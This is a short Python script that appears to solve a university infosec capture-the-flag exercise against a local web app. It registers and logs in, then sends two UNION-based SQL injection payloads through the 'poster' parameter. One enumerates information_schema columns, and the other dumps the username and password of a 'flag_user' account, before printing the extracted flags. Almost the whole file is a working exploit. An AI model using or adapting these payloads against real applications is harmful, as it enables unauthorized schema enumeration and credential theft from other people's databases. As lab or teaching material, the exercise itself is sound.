#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8081"
    s = requests.Session()

    register_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    s.post(url + "/register", data=register_payload)

    login_payload = {"username": "group166", "password": "Super_Secure_INFOSEC21_!?"}
    s.post(url + "/login", data=login_payload)

    filter_payload = {"poster": "' UNION SELECT CURRENT_TIMESTAMP, DATA_TYPE, column_name FROM information_schema.columns WHERE table_name = 'flag"}
    r = s.get(url + "/logged_in", params=filter_payload)
    index = str(r.text).find("InfoSec")
    index2 = str(r.text).find("</td>", index)
    flag1 = (str(r.text)[index:index2])

    filter_payload = {"poster": "' UNION SELECT CURRENT_TIMESTAMP, username, password FROM user WHERE username = 'flag_user"}
    r = s.get(url + "/logged_in", params=filter_payload)
    index = str(r.text).find("InfoSec{")
    index2 = str(r.text).find("}")
    flag2 = (str(r.text)[index:index2+1])

    print(flag1)
    print(flag2)

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


